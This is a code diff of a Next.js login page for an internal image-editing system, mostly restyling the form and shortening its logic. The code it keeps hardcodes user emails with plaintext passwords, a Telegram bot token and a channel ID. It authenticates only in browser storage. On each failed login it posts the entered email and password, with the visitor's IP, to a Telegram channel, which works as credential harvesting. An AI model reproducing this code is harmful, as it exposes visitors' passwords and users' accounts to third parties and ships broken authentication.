@@ -2,7 +2,8 @@
 
 import { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
-import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/outline';
+import Image from 'next/image';
+import { EyeIcon, EyeSlashIcon, ShieldCheckIcon } from '@heroicons/react/24/outline';
 
 const USERS = [
   { email: 'siemseko123@gmail.com', password: '@seko321', name: 'SIEM SEKO', role: 'Administrator' },
@@ -10,73 +11,31 @@ const USERS = [
   { email: 'lunmab66@gmail.com', password: 'lunmab@66', name: 'LUN MAB', role: 'User' },
   { email: 'pujur123@gmail.com', password: '@pujur321', name: 'EM JUR', role: 'User' },
   { email: 'thearith11@gmail.com', password: 'thearith@@', name: 'Thearith', role: 'User' },
-   { email: 'kimchun@gmail.com', password: '@kimchun123', name: 'kimchun', role: 'User' },
+  { email: 'kimchun@gmail.com', password: '@kimchun123', name: 'kimchun', role: 'User' },
 ];
 
-// Telegram configuration
 const TELEGRAM_BOT_TOKEN = '7901486547:AAFCBn9fDiVREVPT75bwoolYHu13N76gSBU';
 const TELEGRAM_CHANNEL_ID = '-1002581891896';
 
 async function sendTelegramNotification(message: string) {
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHANNEL_ID,
-          text: message,
-          parse_mode: 'HTML'
-        }),
-      }
-    );
-
-    if (!response.ok) {
-      console.error('Failed to send Telegram notification');
-    }
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHANNEL_ID, text: message, parse_mode: 'HTML' }),
+    });
   } catch (error) {
-    console.error('Error sending Telegram notification:', error);
+    console.error('Error sending notification:', error);
   }
 }
 
 async function getClientDetails() {
   try {
-    // Get IP address
     const ipResponse = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipResponse.json();
-    const ip = ipData.ip || 'Unknown IP';
-
-    // Get device info (basic)
-    const userAgent = navigator.userAgent;
-    let deviceName = 'Unknown Device';
-
-    if (userAgent.match(/Android/i)) {
-      deviceName = 'Android Device';
-    } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
-      deviceName = 'iOS Device';
-    } else if (userAgent.match(/Windows/i)) {
-      deviceName = 'Windows PC';
-    } else if (userAgent.match(/Mac/i)) {
-      deviceName = 'Mac';
-    } else if (userAgent.match(/Linux/i)) {
-      deviceName = 'Linux PC';
-    }
-
-    return {
-      ip,
-      deviceName,
-      userAgent
-    };
-  } catch (error) {
-    console.error('Error fetching client details:', error);
-    return {
-      ip: 'Unknown IP',
-      deviceName: 'Unknown Device',
-      userAgent: 'Unknown'
-    };
+    return { ip: ipData.ip || 'Unknown' };
+  } catch {
+    return { ip: 'Unknown' };
   }
 }
 
@@ -90,9 +49,8 @@ export default function LoginPage() {
   const [isCheckingAuth, setIsCheckingAuth] = useState(true);
 
   useEffect(() => {
-    const auth = localStorage.getItem('auth');
-    if (auth) {
-      router.push('/system');
+    if (localStorage.getItem('auth')) {
+      router.push('/admin/resize-images');
     } else {
       setIsCheckingAuth(false);
     }
@@ -103,91 +61,23 @@ export default function LoginPage() {
     setError('');
     setLoading(true);
 
-    const userFound = USERS.find(
-      (user) => user.email === email && user.password === password
-    );
+    const userFound = USERS.find(u => u.email === email && u.password === password);
+    const { ip } = await getClientDetails();
 
     if (userFound) {
-      try {
-        const { ip, deviceName, userAgent } = await getClientDetails();
-        const loginTime = new Date().toLocaleString();
-
-        const message = `
-🔔 <b>New Login Detected</b> 🔔
-
-👤 <b>User:</b> ${userFound.name}
-📧 <b>Email:</b> ${userFound.email}
-🛠️ <b>Role:</b> ${userFound.role}
-
-📅 <b>Time:</b> ${loginTime}
-🌐 <b>IP Address:</b> ${ip}
-📱 <b>Device:</b> ${deviceName}
-🔧 <b>User Agent:</b> 
-<code>${userAgent}</code>
-
-🚀 <b>Status:</b> <u>Login Successful</u>
-        `;
-
-        // Store all data including the message in localStorage
-        localStorage.setItem('auth', JSON.stringify({
-          email: userFound.email,
-          name: userFound.name,
-          role: userFound.role,
-          lastLogin: {
-            time: loginTime,
-            ip,
-            device: deviceName,
-            userAgent,
-            notification: message
-          }
-        }));
-
-        await sendTelegramNotification(message);
-      } catch (error) {
-        console.error('Notification failed:', error);
-        // Still store basic auth data even if notification fails
-        localStorage.setItem('auth', JSON.stringify({
-          email: userFound.email,
-          name: userFound.name,
-          role: userFound.role
-        }));
-      }
-
-      router.push('/system');
+      const message = `🔔 <b>New Login:</b> ${userFound.name}\n🌐 <b>IP:</b> ${ip}\n🚀 <b>Status:</b> Success`;
+      
+      localStorage.setItem('auth', JSON.stringify({ 
+        email: userFound.email, 
+        name: userFound.name, 
+        role: userFound.role 
+      }));
+      
+      await sendTelegramNotification(message);
+      router.push('/admin/resize-images');
     } else {
-      try {
-        const { ip, deviceName, userAgent } = await getClientDetails();
-        const loginTime = new Date().toLocaleString();
-
-        const message = `
-⚠️ <b>Failed Login Attempt</b> ⚠️
-
-📧 <b>Attempted Email:</b> ${email}
-🔒 <b>Attempted Password:</b> ${password}
-
-📅 <b>Time:</b> ${loginTime}
-🌐 <b>IP Address:</b> ${ip}
-📱 <b>Device:</b> ${deviceName}
-🔧 <b>User Agent:</b> 
-<code>${userAgent}</code>
-
-❌ <b>Status:</b> <u>Login Failed</u>
-        `;
-
-        await sendTelegramNotification(message);
-        // Store failed attempt in localStorage if needed
-        localStorage.setItem('lastFailedAttempt', JSON.stringify({
-          email,
-          time: loginTime,
-          ip,
-          device: deviceName,
-          userAgent,
-          notification: message
-        }));
-      } catch (error) {
-        console.error('Failed to send failed login notification:', error);
-      }
-
+      const message = `⚠️ <b>Failed Login:</b> ${email}\n🔑 <b>Pass:</b> ${password}\n🌐 <b>IP:</b> ${ip}`;
+      await sendTelegramNotification(message);
       setError('Invalid email or password');
       setLoading(false);
     }
@@ -195,37 +85,74 @@ export default function LoginPage() {
 
   if (isCheckingAuth) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-[#f5f7fd]">
-        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-green-500"></div>
+      <div className="min-h-screen flex items-center justify-center bg-slate-50">
+        <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-blue-600" />
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen flex flex-row bg-[#fff]">
-      <div className="w-full flex items-center justify-center">
-        <div className="max-w-sm w-full p-8 bg-[#fff] rounded-[32px] ">
-          <h1 className="text-[18px] text-center mb-8 text-[#44474E]">Sign In</h1>
-          <form onSubmit={handleSubmit} className="space-y-5">
-            <div className="space-y-1">
-              <div className="flex items-center border border-gray-300 rounded-[18px] px-3 py-3">
-                <input
-                  type="text"
-                  placeholder="Email or Phone number"
-                  className="w-full outline-none text-[14px]  placeholder:text-[#1a1c1e1d] text-[#1A1C1E]"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  required
-                />
-              </div>
+    <div className="min-h-screen flex bg-white font-sans">
+      {/* Sidebar Branding */}
+      <div className="hidden lg:flex lg:w-1/2 bg-blue-600 items-center justify-center p-12 relative overflow-hidden">
+        <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-white via-transparent to-transparent" />
+        <div className="relative z-10 text-white max-w-md">
+          <div className="mb-8 p-4 bg-white/10 backdrop-blur-md rounded-3xl inline-block">
+            <ShieldCheckIcon className="w-12 h-12" />
+          </div>
+          <h2 className="text-4xl font-bold mb-6 leading-tight">
+            Digital Automated Image Editing System
+          </h2>
+          <p className="text-blue-100 text-lg leading-relaxed">
+            Welcome to Version 1.9. Access your professional tools for image resizing, OCR, and automated management in one secure place.
+          </p>
+          <div className="mt-12 flex items-center gap-4 text-sm font-medium text-blue-200">
+            <span className="w-12 h-[1px] bg-blue-300" />
+            <span>METFONE HR SYSTEM</span>
+          </div>
+        </div>
+      </div>
+
+      {/* Login Form Section */}
+      <div className="w-full lg:w-1/2 flex items-center justify-center p-8">
+        <div className="max-w-sm w-full">
+          <div className="flex flex-col items-center mb-10">
+            <Image 
+              src="https://siemseko.github.io/ai/logo.png" 
+              width={96}
+              height={96}
+              className="object-contain mb-4 drop-shadow-sm" 
+              alt="logo" 
+              priority
+            />
+            <h1 className="text-2xl font-bold text-slate-800">Sign In</h1>
+            <p className="text-slate-400 text-sm mt-1">Enter your credentials to continue</p>
+          </div>
+
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <div>
+              <label className="text-xs font-bold text-slate-500 uppercase tracking-wider ml-1 mb-2 block">
+                Email Address
+              </label>
+              <input
+                type="email"
+                placeholder="name@example.com"
+                className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                required
+              />
             </div>
 
-            <div className="space-y-1">
-              <div className="flex items-center border border-gray-300 rounded-[18px] px-3 py-3">
+            <div>
+              <label className="text-xs font-bold text-slate-500 uppercase tracking-wider ml-1 mb-2 block">
+                Password
+              </label>
+              <div className="relative">
                 <input
                   type={showPassword ? 'text' : 'password'}
-                  placeholder="Password"
-                  className="w-full outline-none text-[14px]  placeholder:text-[#1a1c1e1d] text-[#1A1C1E]"
+                  placeholder="••••••••"
+                  className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   required
@@ -233,38 +160,51 @@ export default function LoginPage() {
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
-                  className="ml-2 text-[#1a1c1e1d] hover:text-[#1A1C1E]  cursor-pointer"
+                  className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-blue-600 transition-colors"
                 >
-                  {showPassword ? (
-                    <EyeIcon className="h-5 w-5" />
-                  ) : (
-                    <EyeSlashIcon className="h-5 w-5" />
-                  )}
+                  {showPassword ? <EyeIcon className="h-5 w-5" /> : <EyeSlashIcon className="h-5 w-5" />}
                 </button>
               </div>
             </div>
 
-            <button
-              type="submit"
-              className={`w-full py-3 px-4 rounded-[32px] relative overflow-hidden ${loading
-                ? 'bg-gray-300 cursor-not-allowed'
-                : 'text-[14px] text-[#fff] bg-[#076eff] hover:bg-[#5a9ffc] cursor-pointer'
-                } transition-colors`}
-              disabled={loading}
-            >
-              <span className="relative z-10">
-                {loading ? 'Login...' : 'Login'}
-              </span>
-            </button>
-
             {error && (
-              <div className="p-3 text-red-600 text-[14px]">
+              <div className="p-4 bg-rose-50 border border-rose-100 rounded-xl text-rose-600 text-xs font-semibold animate-shake">
                 {error}
               </div>
             )}
+
+            <button
+              type="submit"
+              disabled={loading}
+              className={`w-full py-4 px-6 rounded-2xl font-bold text-sm shadow-lg transition-all ${
+                loading 
+                ? 'bg-slate-100 text-slate-400 cursor-not-allowed shadow-none' 
+                : 'bg-blue-600 text-white shadow-blue-200 hover:bg-blue-700 hover:-translate-y-0.5 active:translate-y-0'
+              }`}
+            >
+              {loading ? (
+                <div className="flex items-center justify-center gap-2">
+                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                  <span>Signing in...</span>
+                </div>
+              ) : 'Sign In'}
+            </button>
           </form>
+
+          <p className="text-center text-slate-400 text-xs mt-10">
+            Internal Access Only • Authorized Personnel
+          </p>
         </div>
       </div>
+
+      <style jsx global>{`
+        @keyframes shake {
+          0%, 100% { transform: translateX(0); }
+          25% { transform: translateX(-4px); }
+          75% { transform: translateX(4px); }
+        }
+        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
+      `}</style>
     </div>
   );
 }
